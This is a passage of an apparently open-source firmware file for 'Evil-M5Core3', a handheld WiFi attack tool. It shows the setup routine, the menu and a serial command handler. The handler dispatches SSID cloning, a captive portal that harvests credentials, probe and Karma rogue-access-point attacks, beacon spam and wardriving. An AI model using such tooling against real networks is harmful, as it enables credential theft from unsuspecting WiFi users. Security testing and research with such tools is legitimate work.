/*
   Evil-M5Core3 - WiFi Network Testing and Exploration Tool

   Copyright (c) 2024 7h30th3r0n3

   Permission is hereby granted, free of charge, to any person obtaining a copy
   of this software and associated documentation files (the "Software"), to deal
   in the Software without restriction, including without limitation the rights
   to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
   copies of the Software, and to permit persons to whom the Software is
   furnished to do so, subject to the following conditions:

   The above copyright notice and this permission notice shall be included in all
   copies or substantial portions of the Software.

   THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
   IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
   FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
   AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
   LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
   OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
   SOFTWARE.

   Disclaimer:
   This tool, Evil-M5Core3, is developed for educational and ethical testing purposes only.
   Any misuse or illegal use of this tool is strictly prohibited. The creator of Evil-M5Core2
   assumes no liability and is not responsible for any misuse or damage caused by this tool.
   Users are required to comply with all applicable laws and regulations in their jurisdiction
   regarding network testing and ethical hacking.
*/
// remember to change hardcoded webpassword below in the code to ensure no unauthorized access to web interface : !!!!!! CHANGE THIS !!!!!
// Also remember that bluetooth is not protected and anyone can connect to it without pincode ( esp librairies issue) to ensure protection serial password is implemented
#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>
#include <SD.h>
#include <M5Unified.h>
#include <vector>
#include <string>
#include <set>
#include <TinyGPS++.h>
#include <Adafruit_NeoPixel.h> //led
#include <ArduinoJson.h>
#include "BLEDevice.h"
#include <vector>

extern "C" {
#include "esp_wifi.h"
#include "esp_system.h"
}

int ledOn = true;// change this to true to get cool led effect (only on fire)

static constexpr const gpio_num_t SDCARD_CSPIN = GPIO_NUM_4;

WebServer server(80);
DNSServer dnsServer;
const byte DNS_PORT = 53;

int currentIndex = 0, lastIndex = -1;
bool inMenu = true;
const char* menuItems[] = {"Scan WiFi", "Select Network", "Clone & Details" , "Start Captive Portal", "Stop Captive Portal" , "Change Portal", "Check Credentials", "Delete All Credentials", "Monitor Status", "Probe Attack", "Probe Sniffing", "Karma Attack", "Karma Auto", "Karma Spear", "Select Probe", "Delete Probe", "Delete All Probes", "Brightness", "Wardriving", "Beacon Spam", "Deauth Detection", "Wall Of Flipper"};
const int menuSize = sizeof(menuItems) / sizeof(menuItems[0]);

const int maxMenuDisplay = 10;
int menuStartIndex = 0;

String ssidList[100];
int numSsid = 0;
bool isOperationInProgress = false;
int currentListIndex = 0;
String clonedSSID = "Evil-M5Core3";
int topVisibleIndex = 0;

// Connect to nearby wifi network automaticaly to provide internet to the core2 you can be connected and provide AP at same time
// experimental
const char* ssid = ""; // ssid to connect,connection skipped at boot if stay blank ( can be shutdown by different action like probe attack)
const char* password = ""; // wifi password

//!!!!!! CHANGE THIS !!!!!
//!!!!!! CHANGE THIS !!!!!
// password for web access to remote check captured credentials and send new html file !!!!!! CHANGE THIS !!!!!
const char* accessWebPassword = "7h30th3r0n3"; // !!!!!! CHANGE THIS !!!!!
//!!!!!! CHANGE THIS !!!!!
//!!!!!! CHANGE THIS !!!!!
//!!!!!! CHANGE THIS !!!!!

String portalFiles[30]; // 30 portals max
int numPortalFiles = 0;
String selectedPortalFile = "/sites/normal.html"; // defaut portal
int portalFileIndex = 0;


int nbClientsConnected = 0;
int nbClientsWasConnected = 0;
int nbPasswords = 0;
bool isCaptivePortalOn = false;


String macAddresses[10]; // 10 mac address max
int numConnectedMACs = 0;

File fsUploadFile; // global variable for file upload

String captivePortalPassword = "";

// Probe Sniffind part

#define MAX_SSIDS_Karma 200

char ssidsKarma[MAX_SSIDS_Karma][33];
int ssid_count_Karma = 0;
bool isScanningKarma = false;
int currentIndexKarma = -1;
int menuStartIndexKarma = 0;
int menuSizeKarma = 0;
const int maxMenuDisplayKarma = 9;

enum AppState {
  StartScanKarma,
  ScanningKarma,
  StopScanKarma,
  SelectSSIDKarma
};

AppState currentStateKarma = StartScanKarma;

bool isProbeSniffingMode = false;
bool isProbeKarmaAttackMode = false;
bool isKarmaMode = false;

// Probe Sniffing end

// AutoKarma part

volatile bool newSSIDAvailable = false;
char lastSSID[33] = {0};
const int autoKarmaAPDuration = 15000; // Time for Auto Karma Scan can be ajusted if needed consider only add time(Under 10s to fast to let the device check and connect to te rogue AP)
bool isAutoKarmaActive = false;
bool isWaitingForProbeDisplayed = false;
unsigned long lastProbeDisplayUpdate = 0;
int probeDisplayState = 0;
static bool isInitialDisplayDone = false;
char lastDeployedSSID[33] = {0};
bool karmaSuccess = false;
//AutoKarma end

//config file
const char* configFolderPath = "/config";
const char* configFilePath = "/config/config.txt";
int defaultBrightness = 255 * 0.35; //  35% default Brightness

std::vector<std::string> whitelist;
std::set<std::string> seenWhitelistedSSIDs;
//config file end


//led part

#define PIN 15
//#define PIN 25 // for M5Stack Core AWS comment above and uncomment this line
#define NUMPIXELS 10

Adafruit_NeoPixel pixels = Adafruit_NeoPixel(NUMPIXELS, PIN, NEO_GRB);
int delayval = 100;


void setColorRange(int startPixel, int endPixel, uint32_t color) {
  for (int i = startPixel; i <= endPixel; i++) {
    pixels.setPixelColor(i, color);
  }
  pixels.show();
  delay(30);
}

//led part end


// Créer un objet TinyGPS++
TinyGPSPlus gps;

bool isItSerialCommand = false;


// deauth and pwnagotchi detector part

const long channelHopInterval = 200;
unsigned long lastChannelHopTime = 0;
int currentChannelDeauth = 1;
bool autoChannelHop = true; // Commence en mode auto
int lastDisplayedChannelDeauth = -1;
bool lastDisplayedMode = !autoChannelHop; // Initialisez à l'opposé pour forcer la première mise à jour
unsigned long lastScreenClearTime = 0; // Pour suivre le dernier effacement de l'écran
char macBuffer[18];
int maxChannelScanning = 13;
// deauth and pwnagotchi detector end


void setup() {
  M5.begin();
  Serial.begin(115200);
  int GPS_RX_PIN;
  int GPS_TX_PIN;
  switch (M5.getBoard()) {
    case m5::board_t::board_M5StackCore2:
      // Configuration pour Core2
      GPS_RX_PIN = 13;
      GPS_TX_PIN = 14;
      Serial.println("M5Core2 Board detected.");
      break;
    case m5::board_t::board_M5Stack: // Présumé ici comme étant le modèle Fire
      // Configuration pour Fire
      GPS_RX_PIN = 21; // change this to 16/17 for the fire but unstable 
      GPS_TX_PIN = 22;
      Serial.println("M5Fire Board detected.");
      break;
    default:
      // Modèle non pris en charge ou inconnu, éventuellement définir des valeurs par défaut
      GPS_RX_PIN = 18; // for M5Core3 
      GPS_TX_PIN = 17;
      Serial.println("Error detecting board.");
      break;
  }


  M5.Display.setTextSize(2);
  M5.Display.setTextColor(TFT_WHITE);
  M5.Display.setTextFont(1);

  const char* startUpMessages[] = {
    "  There is no spoon...",
    "    Hack the Planet!",
    " Accessing Mainframe...",
    "    Cracking Codes...",
    "Decrypting Messages...",
    "Infiltrating the Network.",
    " Bypassing Firewalls...",
    "Exploring the Deep Web...",
    "Launching Cyber Attack...",
    " Running Stealth Mode...",
    "   Gathering Intel...",
    "     Shara Conord?",
    " Breaking Encryption...",
    "Anonymous Mode Activated.",
    " Cyber Breach Detected.",
    "Initiating Protocol 47...",
    " The Gibson is in Sight.",
    "  Running the Matrix...",
    "Neural Networks Syncing..",
    "Quantum Algorithm started",
    "Digital Footprint Erased.",
    "   Uploading Virus...",
    "Downloading Internet...",
    "  Root Access Granted.",
    "Cyberpunk Mode: Engaged.",
    "  Zero Days Exploited.",
    "Retro Hacking Activated.",
    " Firewall: Deactivated.",
    "Riding the Light Cycle...",
    "  Engaging Warp Drive...",
    "  Hacking the Holodeck..",
    "  Tracing the Nexus-6...",
    "Charging at 2,21 GigaWatt",
    "  Loading Batcomputer...",
    "  Accessing StarkNet...",
    "  Dialing on Stargate...",
    "   Activating Skynet...",
    " Unleashing the Kraken..",
    " Accessing Mainframe...",
    "   Booting HAL 9000...",
    " Death Star loading ...",
    " Initiating Tesseract...",
    "  Decrypting Voynich...",
    "   Hacking the Gibson...",
    "   Orbiting Planet X...",
    "  Accessing SHIELD DB...",
    " Crossing Event Horizon.",
    " Dive in the RabbitHole.",
    "   Rigging the Tardis...",
    " Sneaking into Mordor...",
    "Manipulating the Force...",
    "Decrypting the Enigma...",
    "Jacking into Cybertron..",
    "  Casting a Shadowrun...",
    "  Navigating the Grid...",
    " Surfing the Dark Web...",
    "  Engaging Hyperdrive...",
    " Overclocking the AI...",
    "   Bending Reality...",
    " Scanning the Horizon...",
    " Decrypting the Code...",
    "Solving the Labyrinth...",
    "  Escaping the Matrix...",
    " You know I-Am-Jakoby ?",
    "You know TalkingSasquach?",
    "Redirecting your bandwidth\nfor Leska free WiFi...", // Donation on Ko-fi // Thx Leska !
    "Where we're going We don't\nneed roads   Nefast - 1985",// Donation on Ko-fi // Thx Nefast !
    "Never leave a trace always\n behind you by CyberOzint",// Donation on Ko-fi // Thx CyberOzint !
    "   Injecting hook.worm \nransomware to your android",// Donation on Ko-fi // Thx hook.worm !
    "   Summoning the void             \nby kdv88", // Donation on Ko-fi // Thx kdv88 ! 
    "  Egg sandwich - robt2d2",// Donation on Ko-fi // Thx hook.worm ! Thx robt2d2 !
    "    You know Kiyomi ?   ", // for collab on Wof 
    "           42           ",
    "    Don't be a Skidz !",
    "  Hack,Eat,Sleep,Repeat",
    "   You know Samxplogs ?",
    " For educational purpose",
    "Time to learn something",
    "U Like Karma? Check Mana",
    "   42 because Universe ",
    "Navigating the Cosmos...",
    "Unlocking Stellar Secrets",
    "Galactic Journeys Await..",
    "Exploring Unknown Worlds.",
    "   Charting Star Paths...",
    "   Accessing zone 51... ",
    "Downloading NASA server..",
    "   You know Pwnagotchi ?",
    "   You know FlipperZero?",
    "You know Hash-Monster ?",
    "Synergizing Neuromancer..",
    "Warping Through Cyberspac",
    "Manipulating Quantum Data",
    "Incepting Dreamscapes...",
    "Unlocking Time Capsules..",
    "Rewiring Neural Pathways.",
    "Unveiling Hidden Portals.",
    "Disrupting the Mainframe.",
    "Melding Minds w Machines.",
    "Bending the Digital Rules",
    "   Hack The Planet !!!",
    "Tapping into the Ether...",
    "Writing the Matrix Code..",
    "Sailing the Cyber Seas...",
    "  Reviving Lost Codes...",
    "   HACK THE PLANET !!!",
    " Dissecting DNA of Data",
    "Decrypting the Multiverse",
    "Inverting Reality Matrice",
    "Conjuring Cyber Spells...",
    "Hijacking Time Streams...",
    "Unleashing Digital Demons",
    "Exploring Virtual Vortexe",
    "Summoning Silicon Spirits",
    "Disarming Digital Dragons",
    "Casting Code Conjurations",
    "Unlocking the Ether-Net..",
    " Show me what you got !!!",
    " Do you have good Karma ?",
    "Waves under surveillance!",
    "    Shaking champagne…",
    "Warping with Rick & Morty",
    "       Pickle Rick !!!",
    "Navigating the Multiverse",
    "   Szechuan Sauce Quest.",
    "   Morty's Mind Blowers.",
    "   Ricksy Business Afoot.",
    "   Portal Gun Escapades.",
    "     Meeseeks Mayhem.",
    "   Schwifty Shenanigans.",
    "  Dimension C-137 Chaos.",
    "Cartman's Schemes Unfold.",
    "Stan and Kyle's Adventure",
    "   Mysterion Rises Again.",
    "   Towelie's High Times.",
    "Butters Awkward Escapades",
    "Navigating the Multiverse",
    "    Affirmative Dave,\n        I read you.",
    "  Your Evil-M5Core3 have\n     died of dysentery",
  };
  const int numMessages = sizeof(startUpMessages) / sizeof(startUpMessages[0]);

  randomSeed(esp_random());

  int randomIndex = random(numMessages);
  const char* randomMessage = startUpMessages[randomIndex];

  if (!SD.begin(SDCARD_CSPIN, SPI, 25000000)) {
    Serial.println("Error..");
    Serial.println("SD card not mounted...");
  } else {
    Serial.println("----------------------");
    Serial.println("SD card initialized !! ");
    Serial.println("----------------------");
    restoreConfigParameter("brightness");
    drawImage("/img/startup.jpg");
    if (ledOn) {
      pixels.setPixelColor(4, pixels.Color(255, 0, 0));
      pixels.setPixelColor(5, pixels.Color(255, 0, 0));
      pixels.show();
      delay(100);

      pixels.setPixelColor(3, pixels.Color(255, 0, 0));
      pixels.setPixelColor(6, pixels.Color(255, 0, 0));
      pixels.show();
      delay(100);

      pixels.setPixelColor(2, pixels.Color(255, 0, 0));
      pixels.setPixelColor(7, pixels.Color(255, 0, 0));
      pixels.show();
      delay(100);

      pixels.setPixelColor(1, pixels.Color(255, 0, 0));
      pixels.setPixelColor(8, pixels.Color(255, 0, 0));
      pixels.show();
      delay(100);

      pixels.setPixelColor(0, pixels.Color(255, 0, 0));
      pixels.setPixelColor(9, pixels.Color(255, 0, 0));
      pixels.show();
      delay(100);
      delay(1000);
    } else {
      delay(2000);
    }

  }

  String batteryLevelStr = getBatteryLevel();
  int batteryLevel = batteryLevelStr.toInt();

  if (batteryLevel < 15) {
    drawImage("/img/low-battery.jpg");
    Serial.println("-------------------");
    Serial.println("!!!!Low Battery!!!!");
    Serial.println("-------------------");
    delay(4000);
  }

  int textY = 80;
  int lineOffset = 10;
  int lineY1 = textY - lineOffset;
  int lineY2 = textY + lineOffset + 30;

  M5.Display.clear();
  M5.Display.drawLine(0, lineY1, M5.Display.width(), lineY1, TFT_WHITE);
  M5.Display.drawLine(0, lineY2, M5.Display.width(), lineY2, TFT_WHITE);

  M5.Display.setCursor(80, textY);
  M5.Display.println(" Evil-M5Core3");
  Serial.println("-------------------");
  Serial.println(" Evil-M5Core3");
  M5.Display.setCursor(75, textY + 20);
  M5.Display.println("By 7h30th3r0n3");
  M5.Display.setCursor(102, textY + 45);
  M5.Display.println("v1.1.9 2024");
  Serial.println("By 7h30th3r0n3");
  Serial.println("-------------------");
  M5.Display.setCursor(0 , textY + 120);
  M5.Display.println(randomMessage);
  Serial.println(" ");
  Serial.println(randomMessage);
  Serial.println("-------------------");
  firstScanWifiNetworks();
  if (ledOn) {
    pixels.setPixelColor(4, pixels.Color(0, 0, 0));
    pixels.setPixelColor(5, pixels.Color(0, 0, 0));
    pixels.show();
    delay(50);

    pixels.setPixelColor(3, pixels.Color(0, 0, 0));
    pixels.setPixelColor(6, pixels.Color(0, 0, 0));
    pixels.show();
    delay(50);

    pixels.setPixelColor(2, pixels.Color(0, 0, 0));
    pixels.setPixelColor(7, pixels.Color(0, 0, 0));
    pixels.show();
    delay(50);

    pixels.setPixelColor(1, pixels.Color(0, 0, 0));
    pixels.setPixelColor(8, pixels.Color(0, 0, 0));
    pixels.show();
    delay(50);

    pixels.setPixelColor(0, pixels.Color(0, 0, 0));
    pixels.setPixelColor(9, pixels.Color(0, 0, 0));
    pixels.show();
    delay(50);
  }

  if (strcmp(ssid, "") != 0) {
    WiFi.mode(WIFI_MODE_APSTA);
    WiFi.begin(ssid, password);

    unsigned long startAttemptTime = millis();

    while (WiFi.status() != WL_CONNECTED && millis() - startAttemptTime < 3000) {
      delay(500);
      Serial.println("Trying to connect to Wifi...");
    }

    if (WiFi.status() == WL_CONNECTED) {
      Serial.println("Connected to wifi !!!");
    } else {
      Serial.println("Fail to connect to Wifi or timeout...");
    }
  } else {
    Serial.println("SSID is empty.");
    Serial.println("Skipping Wi-Fi connection.");
    Serial.println("----------------------");
  }

  pixels.begin(); // led
  Serial2.begin(9600, SERIAL_8N1, GPS_RX_PIN, GPS_TX_PIN);  //  GPS, change RX_PIN et TX_PIN if needed
}


void drawImage(const char *filepath) {
  fs::File file = SD.open(filepath);
  M5.Display.drawJpgFile(SD, filepath);

  file.close();
}


void firstScanWifiNetworks() {
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  unsigned long startTime = millis();
  int n;
  while (millis() - startTime < 2000) {
    n = WiFi.scanNetworks();
    if (n != WIFI_SCAN_RUNNING) break;
  }

  if (n == 0) {
    Serial.println("No network found ...");
  } else {
    Serial.print(n);
    Serial.println(" Near Wifi Networks : ");
    Serial.println("-------------------");
    numSsid = min(n, 100);
    for (int i = 0; i < numSsid; i++) {
      ssidList[i] = WiFi.SSID(i);
      Serial.print(i);
      Serial.print(": ");
      Serial.println(ssidList[i]);
    }
    Serial.println("-------------------");
  }
}

unsigned long previousMillis = 0;
const long interval = 1000;


void loop() {
  M5.update();
  handleDnsRequestSerial();
  if (inMenu) {
    if (lastIndex != currentIndex) {
      drawMenu();
      lastIndex = currentIndex;
    }
    handleMenuInput();
  } else {
    switch (currentStateKarma) {
      case StartScanKarma:
        if (M5.Touch.getCount()) {
          // Attendre que l'utilisateur relâche tous les touchers avant de commencer
          while (M5.Touch.getCount() != 0) {
            M5.update();
            delay(10); // Attente courte pour laisser le temps à l'utilisateur de relâcher le toucher
          }
          startScanKarma();
          currentStateKarma = ScanningKarma;
        }
        break;

      case ScanningKarma:
        if (M5.Touch.getCount()) {
          // Attendre que l'utilisateur relâche tous les touchers avant de commencer
          while (M5.Touch.getCount() != 0) {
            M5.update();
            delay(10); // Attente courte pour laisser le temps à l'utilisateur de relâcher le toucher
          }
          isKarmaMode = true;
          stopScanKarma();
          currentStateKarma = ssid_count_Karma > 0 ? StopScanKarma : StartScanKarma;
        }
        break;

      case StopScanKarma:
        handleMenuInputKarma();
        break;

      case SelectSSIDKarma:
        handleMenuInputKarma();
        break;
    }

    if (M5.Touch.getCount() && currentStateKarma == StartScanKarma) {
      inMenu = true;
      isOperationInProgress = false;
    }
  }
}



void executeMenuItem(int index) {
  inMenu = false;
  isOperationInProgress = true;
  switch (index) {
    case 0:
      scanWifiNetworks();
      break;
    case 1:
      showWifiList();
      break;
    case 2:
      showWifiDetails(currentListIndex);
      break;
    case 3:
      createCaptivePortal();
      break;
    case 4:
      stopCaptivePortal();
      break;
    case 5:
      changePortal();
      break;
    case 6:
      checkCredentials();
      break;
    case 7:
      deleteCredentials();
      break;
    case 8:
      displayMonitorPage1();
      break;
    case 9:
      probeAttack();
      break;
    case 10:
      probeSniffing();
      break;
    case 11:
      karmaAttack();
      break;
    case 12:
      startAutoKarma();
      break;
    case 13:
      karmaSpear();
      break;
    case 14:
      listProbes();
      break;
    case 15:
      deleteProbe();
      break;
    case 16:
      deleteAllProbes();
      break;
    case 17:
      brightness();
      break;
    case 18:
      wardrivingMode();
      break;
    case 19:
      beaconAttack();
      break;
    case 20:
      deauthDetect();
      break;
    case 21:
      wallOfFlipper();
      break;
  }
  isOperationInProgress = false;
}



void handleMenuInput() {
  static bool isTouchHandled = false;

  M5.update();

  int largeurZone = M5.Display.width() / 3;

  if (M5.Touch.getCount()) {
    if (!isTouchHandled) {
      auto touch = M5.Touch.getDetail();

      // Zone gauche
      if (touch.x < largeurZone) {
        currentIndex--;
        if (currentIndex < 0) {
          currentIndex = menuSize - 1;
          if (menuSize > maxMenuDisplay) menuStartIndex = menuSize - maxMenuDisplay;
          else menuStartIndex = 0;
        } else if (currentIndex < menuStartIndex) {
          menuStartIndex = currentIndex;
        }
        isTouchHandled = true;
      }
      // Zone droite
      else if (touch.x >= 2 * largeurZone) {
        currentIndex++;
        if (currentIndex >= menuSize) {
          currentIndex = 0;
          menuStartIndex = 0;
        } else if (currentIndex >= menuStartIndex + maxMenuDisplay) {
          menuStartIndex = currentIndex - maxMenuDisplay + 1;
        }
        isTouchHandled = true;
      }
      // Zone centrale
      else if (touch.x >= largeurZone && touch.x < 2 * largeurZone) {
        if (touch.wasClicked()) {
          executeMenuItem(currentIndex);
          isTouchHandled = true;
        }
      }
    }
  } else {
    isTouchHandled = false;
  }

  // Assurez-vous que menuStartIndex reste dans les limites valides
  if (menuStartIndex < 0) menuStartIndex = 0;
  if (menuSize <= maxMenuDisplay) menuStartIndex = 0; // Ajouté pour gérer le cas où il y a moins d'éléments que maxMenuDisplay
  else if (menuStartIndex > menuSize - maxMenuDisplay) menuStartIndex = menuSize - maxMenuDisplay;
}


void drawMenu() {
  M5.Display.clear();
  M5.Display.setTextSize(2);
  M5.Display.setTextFont(1);

  int lineHeight = 22;
  int startX = 5;
  int startY = 0;

  for (int i = 0; i < maxMenuDisplay; i++) {
    int menuIndex = menuStartIndex + i;
    if (menuIndex >= menuSize) break;

    if (menuIndex == currentIndex) {
      M5.Display.fillRect(0, startY + i * lineHeight, M5.Display.width(), lineHeight, TFT_NAVY);
      M5.Display.setTextColor(TFT_GREEN);
    } else {
      M5.Display.setTextColor(TFT_WHITE);
    }
    M5.Display.setCursor(startX, startY + i * lineHeight + (lineHeight / 2) - 8);
    M5.Display.println(menuItems[menuIndex]);
  }
  M5.Display.setTextColor(TFT_DARKGRAY); // thanks to kdv88 for this button
  M5.Display.setCursor(58, 220);
  M5.Display.println("Up");
  M5.Display.setCursor(130, 220);
  M5.Display.println("Select");
  M5.Display.setCursor(233, 220);
  M5.Display.println("Down");
  M5.Display.display();
  M5.Display.setTextColor(TFT_WHITE);

}


void handleDnsRequestSerial() {
  dnsServer.processNextRequest();
  server.handleClient();
  if (Serial.available()) {
    String command = Serial.readStringUntil('\n');
    checkSerialCommands();
  }
}



void listProbesSerial() {
  File file = SD.open("/probes.txt", FILE_READ);
  if (!file) {
    Serial.println("Failed to open probes.txt");
    //sendBLE("Failed to open probes.txt");
    return;
  }

  int probeIndex = 0;
  Serial.println("List of Probes:");
  //sendBLE("List of Probes:");
  while (file.available()) {
    String probe = file.readStringUntil('\n');
    probe.trim();
    if (probe.length() > 0) {
      Serial.println(String(probeIndex) + ": " + probe);
      //sendBLE(String(probeIndex) + ": " + probe);
      probeIndex++;
    }
  }
  file.close();
}

void selectProbeSerial(int index) {
  File file = SD.open("/probes.txt", FILE_READ);
  if (!file) {
    Serial.println("Failed to open probes.txt");
    return;
  }

  int currentIndex = 0;
  String selectedProbe = "";
  while (file.available()) {
    String probe = file.readStringUntil('\n');
    if (currentIndex == index) {
      selectedProbe = probe;
      break;
    }
    currentIndex++;
  }
  file.close();

  if (selectedProbe.length() > 0) {
    clonedSSID = selectedProbe;
    Serial.println("Probe selected: " + selectedProbe);
    //sendBLE("Probe selected: " + selectedProbe);
  } else {
    Serial.println("Probe index not found.");
    //sendBLE("Probe index not found.");
  }
}

String currentlySelectedSSID = "";
bool isProbeAttackRunning = false;
bool stopProbeSniffingViaSerial = false;
bool isProbeSniffingRunning = false;

void checkSerialCommands() {
  if (Serial.available()) {
    String command = Serial.readStringUntil('\n');
    command.trim();
    if (command == "scan_wifi") {
      isOperationInProgress = true;
      inMenu = false;
      scanWifiNetworks();
      //sendBLE("-------------------");
      //sendBLE("Near Wifi Network : ");
      for (int i = 0; i < numSsid; i++) {
        ssidList[i] = WiFi.SSID(i);
        //sendBLE(String(i) + ": " + ssidList[i]);
      }
    } else if (command.startsWith("select_network")) {
      int ssidIndex = command.substring(String("select_network ").length()).toInt();
      selectNetwork(ssidIndex);
      //sendBLE("SSID sélectionné: " + currentlySelectedSSID);
    } else if (command.startsWith("change_ssid ")) {
      String newSSID = command.substring(String("change_ssid ").length());
      cloneSSIDForCaptivePortal(newSSID);
      Serial.println("Cloned SSID changed to: " + clonedSSID);
      //sendBLE("Cloned SSID changed to: " + clonedSSID);
    } else if (command.startsWith("set_portal_password ")) {
      String newPassword = command.substring(String("set_portal_password ").length());
      captivePortalPassword = newPassword;
      Serial.println("Captive portal password changed to: " + captivePortalPassword);
      //sendBLE("Captive portal password changed to: " + captivePortalPassword);
    } else if (command.startsWith("set_portal_open")) {
      captivePortalPassword = "";
      Serial.println("Open Captive portal set");
      //sendBLE("Open Captive portal set");
    } else if (command.startsWith("detail_ssid")) {
      int ssidIndex = command.substring(String("detail_ssid ").length()).toInt();
      String security = getWifiSecurity(ssidIndex);
      int32_t rssi = WiFi.RSSI(ssidIndex);
      uint8_t* bssid = WiFi.BSSID(ssidIndex);
      String macAddress = bssidToString(bssid);
      M5.Display.display();
      Serial.println("------Wifi-Info----");
      //sendBLE("------Wifi-Info----");
      Serial.println("SSID: " + (ssidList[ssidIndex].length() > 0 ? ssidList[ssidIndex] : "N/A"));
      //sendBLE("SSID: " + (ssidList[ssidIndex].length() > 0 ? ssidList[ssidIndex] : "N/A"));
      Serial.println("Channel: " + String(WiFi.channel(ssidIndex)));
      //sendBLE("Channel: " + String(WiFi.channel(ssidIndex)));
      Serial.println("Security: " + security);
      //sendBLE("Security: " + security);
      Serial.println("Signal: " + String(rssi) + " dBm");
      //sendBLE("Signal: " + String(rssi) + " dBm");
      Serial.println("MAC: " + macAddress);
      //sendBLE("MAC: " + macAddress);
      Serial.println("-------------------");
      //sendBLE("-------------------");
    } else if (command == "clone_ssid") {
      cloneSSIDForCaptivePortal(currentlySelectedSSID);
      Serial.println("Cloned SSID: " + clonedSSID);
      //sendBLE("Cloned SSID: " + clonedSSID);
    } else if (command == "start_portal") {
      createCaptivePortal();
      //sendBLE("Start portal with " + clonedSSID);
    } else if (command == "stop_portal") {
      stopCaptivePortal();
      //sendBLE("Portal Stopped ");
    } else if (command == "list_portal") {
      File root = SD.open("/sites");
      numPortalFiles = 0;
      Serial.println("Available portals:");
      //sendBLE("-------------------");
      //sendBLE("Availables portals :");
      while (File file = root.openNextFile()) {
        if (!file.isDirectory()) {
          String fileName = file.name();
          if (fileName.endsWith(".html")) {
            portalFiles[numPortalFiles] = String("/sites/") + fileName;

            Serial.print(numPortalFiles);
            Serial.print(": ");
            Serial.println(fileName);
            //sendBLE(String(numPortalFiles) + ": " + fileName);
            numPortalFiles++;
            if (numPortalFiles >= 30) break; // max 30 files
          }
        }
        file.close();
      }
      root.close();
    } else if (command.startsWith("change_portal")) {
      int portalIndex = command.substring(String("change_portal ").length()).toInt();
      changePortal(portalIndex);
    } else if (command == "check_credentials") {
      checkCredentialsSerial();
    } else if (command == "monitor_status") {
      String status = getMonitoringStatus();
      Serial.println("-------------------");
      //sendBLE("-------------------");
      Serial.println(status);
      //sendBLE(status);
    } else if (command == "probe_attack") {
      isOperationInProgress = true;
      inMenu = false;
      isItSerialCommand = true;
      probeAttack();
      delay(200);
    } else if (command == "stop_probe_attack") {
      if (isProbeAttackRunning) {
        isProbeAttackRunning = false;
        Serial.println("-------------------");
        //sendBLE("-------------------");
        Serial.println("Stopping probe attack...");
        //sendBLE("Stopping probe attack...");
        Serial.println("-------------------");
        //sendBLE("-------------------");
      } else {
        Serial.println("-------------------");
        //sendBLE("-------------------");
        Serial.println("No probe attack running.");
        //sendBLE("No probe attack running.");
        Serial.println("-------------------");
        //sendBLE("-------------------");
      }
    } else if (command == "probe_sniffing") {
      isOperationInProgress = true;
      inMenu = false;
      probeSniffing();
      delay(200);
    } else if (command == "stop_probe_sniffing") {
      stopProbeSniffingViaSerial = true;
      isProbeSniffingRunning = false;
      Serial.println("-------------------");
      //sendBLE("-------------------");
      Serial.println("Stopping probe sniffing via Serial...");
      //sendBLE("Stopping probe sniffing via Serial...");
      Serial.println("-------------------");
      //sendBLE("-------------------");
    } else if (command == "list_probes") {
      listProbesSerial();
    } else if (command.startsWith("select_probes ")) {
      int index = command.substring(String("select_probes ").length()).toInt();
      selectProbeSerial(index);
    } else if (command == "karma_auto") {
      isOperationInProgress = true;
      inMenu = false;
      startAutoKarma();
      delay(200);
    } else if (command == "help") {
      Serial.println("-------------------");
      //sendBLE("-------------------");
      Serial.println("Available Commands:");
      //sendBLE("Available Commands:");
      Serial.println("scan_wifi - Scan WiFi Networks");
      //sendBLE("scan_wifi - Scan WiFi Networks");
      Serial.println("select_network <index> - Select WiFi <index>");
      //sendBLE("select_network <index> - Select WiFi <index>");
      Serial.println("change_ssid <max 32 char> - change current SSID");
      //sendBLE("change_ssid <max 32 char> - change current SSID");
      Serial.println("set_portal_password <password min 8> - change portal password");
      //sendBLE("set_portal_password <password min 8> - portal pass");
      Serial.println("set_portal_open  - change portal to open");
      //sendBLE("set_portal_open - change portal to open");
      Serial.println("detail_ssid <index> - Details of WiFi <index>");
      //sendBLE("detail_ssid <index> - Details of WiFi <index>");
      Serial.println("clone_ssid - Clone Network SSID");
      //sendBLE("clone_ssid - Clone Network SSID");
      Serial.println("start_portal - Activate Captive Portal");
      //sendBLE("start_portal - Activate Captive Portal");
      Serial.println("stop_portal - Deactivate Portal");
      //sendBLE("stop_portal - Deactivate Portal");
      Serial.println("list_portal - Show Portal List");
      //sendBLE("list_portal - Show Portal List");
      Serial.println("change_portal <index> - Switch Portal <index>");
      //sendBLE("change_portal <index> - Switch Portal <index>");
      Serial.println("check_credentials - Check Saved Credentials");
      //sendBLE("check_credentials - Check Saved Credentials");
      Serial.println("monitor_status - Get current information on device");
      //sendBLE("monitor_status - Get current information on device");
      Serial.println("probe_attack - Initiate Probe Attack");
      Serial.println("stop_probe_attack - End Probe Attack");
      Serial.println("probe_sniffing - Begin Probe Sniffing");
      Serial.println("stop_probe_sniffing - End Probe Sniffing");
      Serial.println("list_probes - Show Probes");
      //sendBLE("list_probes - Show Probes");
      Serial.println("select_probes <index> - Choose Probe <index>");
      //sendBLE("select_probes <index> - Choose Probe <index>");
      Serial.println("karma_auto - Auto Karma Attack Mode");
      //sendBLE("exit - !! exit and set password for new connexion !!");
      Serial.println("-------------------");
      //sendBLE("-------------------");
    } else {
      Serial.println("-------------------");
      //sendBLE("-------------------");
      Serial.println("Command not recognized: " + command);
      //sendBLE("Command not recognized: " + command);
      Serial.println("-------------------");
      //sendBLE("-------------------");
    }
  }
}

String getMonitoringStatus() {
  String status;
  int numClientsConnected = WiFi.softAPgetStationNum();
  int numCredentials = countPasswordsInFile();

  status += "Clients: " + String(numClientsConnected) + "\n";
  status += "Credentials: " + String(numCredentials) + "\n";
  status += "SSID: " + String(clonedSSID) + "\n";
  status += "Portal: " + String(isCaptivePortalOn ? "On" : "Off") + "\n";
  status += "Page: " + String(selectedPortalFile.substring(7)) + "\n";
  updateConnectedMACs();
  status += "Connected MACs:\n";
